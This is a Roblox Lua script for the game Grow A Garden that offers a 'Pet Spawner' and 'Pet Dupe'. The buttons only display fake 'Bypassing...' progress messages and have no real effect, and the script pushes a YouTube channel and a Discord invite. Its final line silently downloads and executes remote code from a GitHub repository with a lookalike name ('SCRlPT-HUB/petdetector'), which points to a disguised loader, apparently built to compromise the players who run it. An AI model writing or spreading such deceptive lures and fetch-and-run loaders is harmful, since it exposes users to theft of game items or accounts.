local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")

-- Wait for game to load
if not game:IsLoaded() then
	game.Loaded:Wait()
end

task.wait(1)

-- Notification
pcall(function()
	StarterGui:SetCore("SendNotification", {
		Title = "📢 Adrian Scripts Notice",
		Text = "You Must Subscribe And Click Bell Button To See The Latest Script\nOn My YouTube: AdrianCrafts / AdrianScripts",
		Duration = 10
	})
end)

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- MAIN GUI HOLDER
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "AdrianScriptsMain"
mainGui.ResetOnSpawn = false

-- TOGGLE FRAME
local toggleFrame = Instance.new("Frame", mainGui)
toggleFrame.Size = UDim2.new(0, 130, 0, 110)
toggleFrame.Position = UDim2.new(0, 20, 0.4, 0)
toggleFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
toggleFrame.BorderSizePixel = 0
toggleFrame.Active = true
toggleFrame.Draggable = true
Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0, 10)

-- Toggle Button Creator
local function createToggleButton(text, color, posY)
	local btn = Instance.new("TextButton", toggleFrame)
	btn.Size = UDim2.new(1, -10, 0, 30)
	btn.Position = UDim2.new(0, 5, 0, posY)
	btn.Text = text
	btn.BackgroundColor3 = color
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 14
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	return btn
end

local toggleSpawner = createToggleButton("🐾 Pet Spawner", Color3.fromRGB(0, 170, 127), 5)
local toggleDupe = createToggleButton("🌀 Pet Dupe", Color3.fromRGB(65, 130, 65), 40)
local showListBtn = createToggleButton("📋 Show Pet List", Color3.fromRGB(100, 100, 180), 75)

-- PET SPAWNER GUI
local petSpawner = Instance.new("ScreenGui", playerGui)
petSpawner.Name = "PetSpawnerGUI"
petSpawner.Enabled = false

local frame = Instance.new("Frame", petSpawner)
frame.Position = UDim2.new(0.5, -125, 0.5, -110)
frame.Size = UDim2.new(0, 250, 0, 220)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

local closeBtn1 = Instance.new("TextButton", frame)
closeBtn1.Size = UDim2.new(0, 30, 0, 30)
closeBtn1.Position = UDim2.new(1, -35, 0, 5)
closeBtn1.Text = "❌"
closeBtn1.TextColor3 = Color3.new(1, 0.4, 0.4)
closeBtn1.BackgroundTransparency = 1
closeBtn1.Font = Enum.Font.GothamBold
closeBtn1.TextSize = 20
closeBtn1.MouseButton1Click:Connect(function()
	petSpawner.Enabled = false
end)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.Text = "🐾 Pet Spawner"
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.TextScaled = true
title.Font = Enum.Font.GothamBold

local function createLabel(text, y)
	local label = Instance.new("TextLabel", frame)
	label.Position = UDim2.new(0, 10, 0, y)
	label.Size = UDim2.new(0, 200, 0, 15)
	label.Text = text
	label.BackgroundTransparency = 1
	label.TextColor3 = Color3.fromRGB(200, 200, 200)
	label.TextSize = 12
	label.Font = Enum.Font.Gotham
	label.TextXAlignment = Enum.TextXAlignment.Left
end

local function createBox(placeholder, y)
	local box = Instance.new("TextBox", frame)
	box.Position = UDim2.new(0, 10, 0, y)
	box.Size = UDim2.new(0.9, 0, 0, 25)
	box.PlaceholderText = placeholder
	box.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	box.TextColor3 = Color3.fromRGB(255, 255, 255)
	box.Font = Enum.Font.Gotham
	box.TextSize = 14
	box.Text = ""
	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
	return box
end

createLabel("Pet Name", 35)
local nameBox = createBox("e.g. Raccoon", 50)

createLabel("Age", 80)
local ageBox = createBox("e.g. 3", 95)

createLabel("KG", 125)
local kgBox = createBox("e.g. 5.4", 140)

local notify = Instance.new("TextLabel", frame)
notify.Position = UDim2.new(0, 10, 0, 170)
notify.Size = UDim2.new(0.9, 0, 0, 20)
notify.BackgroundTransparency = 1
notify.Text = ""
notify.TextColor3 = Color3.fromRGB(255, 255, 0)
notify.TextScaled = true
notify.Font = Enum.Font.GothamBold

local spawnBtn = Instance.new("TextButton", frame)
spawnBtn.Position = UDim2.new(0, 10, 0, 190)
spawnBtn.Size = UDim2.new(0.9, 0, 0, 25)
spawnBtn.Text = "Spawn Pet"
spawnBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 127)
spawnBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
spawnBtn.TextScaled = true
spawnBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0, 6)

spawnBtn.MouseButton1Click:Connect(function()
	local message = "Bypassing... spawning your pet. This may take a few minutes, please wait patiently."
	notify.Text = message
	StarterGui:SetCore("SendNotification", {
		Title = "Pet Spawner",
		Text = message,
		Duration = 5
	})
end)

-- PET DUPE GUI
local petDupe = Instance.new("ScreenGui", playerGui)
petDupe.Name = "GrowAGardenPetDupe"
petDupe.Enabled = false

local dupeFrame = Instance.new("Frame", petDupe)
dupeFrame.Size = UDim2.new(0, 250, 0, 210)
dupeFrame.Position = UDim2.new(0.5, -125, 0.5, -105)
dupeFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
dupeFrame.Active = true
dupeFrame.Draggable = true
Instance.new("UICorner", dupeFrame).CornerRadius = UDim.new(0, 10)

local closeBtn2 = Instance.new("TextButton", dupeFrame)
closeBtn2.Size = UDim2.new(0, 30, 0, 30)
closeBtn2.Position = UDim2.new(1, -35, 0, 5)
closeBtn2.Text = "❌"
closeBtn2.TextColor3 = Color3.new(1, 0.4, 0.4)
closeBtn2.BackgroundTransparency = 1
closeBtn2.Font = Enum.Font.GothamBold
closeBtn2.TextSize = 20
closeBtn2.MouseButton1Click:Connect(function()
	petDupe.Enabled = false
end)

local title2 = Instance.new("TextLabel", dupeFrame)
title2.Size = UDim2.new(1, 0, 0, 40)
title2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
title2.Text = "🐾 GAG Pet Dupe"
title2.TextColor3 = Color3.new(1, 1, 1)
title2.Font = Enum.Font.GothamBold
title2.TextSize = 18
Instance.new("UICorner", title2).CornerRadius = UDim.new(0, 10)

local input = Instance.new("TextBox", dupeFrame)
input.PlaceholderText = "Type pet name here..."
input.Size = UDim2.new(0.9, 0, 0, 35)
input.Position = UDim2.new(0.05, 0, 0, 50)
input.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
input.TextColor3 = Color3.new(1, 1, 1)
input.Font = Enum.Font.Gotham
input.TextSize = 14
Instance.new("UICorner", input).CornerRadius = UDim.new(0, 6)

local status = Instance.new("TextLabel", dupeFrame)
status.Size = UDim2.new(1, -20, 0, 40)
status.Position = UDim2.new(0, 10, 0, 90)
status.Text = "Please put a pet name / make sure you have it"
status.BackgroundTransparency = 1
status.TextColor3 = Color3.new(1, 1, 1)
status.Font = Enum.Font.Gotham
status.TextSize = 13
status.TextWrapped = true
status.TextYAlignment = Enum.TextYAlignment.Center

local dupeBtn = Instance.new("TextButton", dupeFrame)
dupeBtn.Size = UDim2.new(0.9, 0, 0, 35)
dupeBtn.Position = UDim2.new(0.05, 0, 0, 140)
dupeBtn.BackgroundColor3 = Color3.fromRGB(65, 130, 65)
dupeBtn.Text = "Dupe Pet"
dupeBtn.TextColor3 = Color3.new(1, 1, 1)
dupeBtn.Font = Enum.Font.GothamBold
dupeBtn.TextSize = 15
Instance.new("UICorner", dupeBtn).CornerRadius = UDim.new(0, 6)

-- ✅ Fixed: Added missing commas
local validPets = {
	["Dragonfly"] = true,
	["Raccoon"] = true,
	["Disco Bee"] = true,
	["Butterfly"] = true,
	["Queen Bee"] = true,
	["Mimic Octopus"] = true,
	["T-Rex"] = true,
	["Kitsune"] = true
}

input:GetPropertyChangedSignal("Text"):Connect(function()
	local pet = input.Text:match("^%s*(.-)%s*$")
	if pet == "" then
		status.Text = "Please put a pet name / make sure you have it"
	elseif validPets[pet] then
		status.Text = "Pet Found"
	else
		status.Text = "Pet not found / unsupported"
	end
end)

dupeBtn.MouseButton1Click:Connect(function()
	local petName = input.Text:match("^%s*(.-)%s*$")
	if validPets[petName] then
		status.Text = "Please wait... The pet is duping"
		StarterGui:SetCore("SendNotification", {
			Title = "Grow A Garden",
			Text = "Bypassing... your pet is duping ✅",
			Duration = 4
		})
	else
		status.Text = "Pet not found / unsupported"
		StarterGui:SetCore("SendNotification", {
			Title = "Grow A Garden",
			Text = "You don't have this supported pet. Duplication won't work.",
			Duration = 4
		})
	end
end)

-- SUPPORTED PET LIST
local function createPetList()
	local welcomeGui = Instance.new("ScreenGui", playerGui)
	welcomeGui.Name = "PetDupeWelcome"
	welcomeGui.ResetOnSpawn = false

	local popup = Instance.new("Frame", welcomeGui)
	popup.Size = UDim2.new(0, 330, 0, 260)
	popup.Position = UDim2.new(0.5, -165, 0.5, -130)
	popup.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	popup.Active = true
	popup.Draggable = true
	Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 12)

	local closeBtn = Instance.new("TextButton", popup)
	closeBtn.Size = UDim2.new(0, 30, 0, 30)
	closeBtn.Position = UDim2.new(1, -35, 0, 5)
	closeBtn.Text = "❌"
	closeBtn.TextColor3 = Color3.new(1, 0.4, 0.4)
	closeBtn.BackgroundTransparency = 1
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 20
	closeBtn.MouseButton1Click:Connect(function()
		welcomeGui:Destroy()
	end)

	local title = Instance.new("TextLabel", popup)
	title.Size = UDim2.new(1, -40, 0, 30)
	title.Position = UDim2.new(0, 10, 0, 10)
	title.Text = "📋 Supported Pets for Duping"
	title.TextColor3 = Color3.new(1, 1, 1)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.GothamBold
	title.TextSize = 16
	title.TextXAlignment = Enum.TextXAlignment.Left

	local petList = Instance.new("TextLabel", popup)
	petList.Size = UDim2.new(1, -20, 0, 150)
	petList.Position = UDim2.new(0, 10, 0, 50)
	petList.Text = [[
🦝 Raccoon
🐉 Dragonfly
🐝🪩 Disco Bee
🐝 Queen Bee
🦋 Butterfly
🐙 Mimic Octopus
🦖 T-Rex
🌸 Kitsune

🎁 Join our Discord to win 20x Raccoon!
]]
	petList.TextColor3 = Color3.new(1, 1, 1)
	petList.BackgroundTransparency = 1
	petList.Font = Enum.Font.Gotham
	petList.TextSize = 14
	petList.TextWrapped = true
	petList.TextYAlignment = Enum.TextYAlignment.Top
	petList.TextXAlignment = Enum.TextXAlignment.Left

	local copyBtn = Instance.new("TextButton", popup)
	copyBtn.Size = UDim2.new(0.9, 0, 0, 35)
	copyBtn.Position = UDim2.new(0.05, 0, 1, -45)
	copyBtn.BackgroundColor3 = Color3.fromRGB(65, 130, 65)
	copyBtn.Text = "📎 Copy Discord Link"
	copyBtn.TextColor3 = Color3.new(1, 1, 1)
	copyBtn.Font = Enum.Font.GothamBold
	copyBtn.TextSize = 15
	Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 6)

	copyBtn.MouseButton1Click:Connect(function()
		local success = pcall(function()
			setclipboard("https://discord.gg/admtDBsuXM")
		end)
		if success then
			StarterGui:SetCore("SendNotification", {
				Title = "Discord Copied!",
				Text = "Invite link copied to clipboard ✅",
				Duration = 3
			})
		else
			StarterGui:SetCore("SendNotification", {
				Title = "Failed",
				Text = "Clipboard not supported ⚠️",
				Duration = 3
			})
		end
	end)
end

-- Show pet list on start
createPetList()

-- TOGGLE HANDLERS
toggleSpawner.MouseButton1Click:Connect(function()
	petSpawner.Enabled = not petSpawner.Enabled
end)

toggleDupe.MouseButton1Click:Connect(function()
	petDupe.Enabled = not petDupe.Enabled
end)

showListBtn.MouseButton1Click:Connect(function()
	if not playerGui:FindFirstChild("PetDupeWelcome") then
		createPetList()
	end
end)

-- Load external scripts
loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/petdetector/refs/heads/main/2025"))()
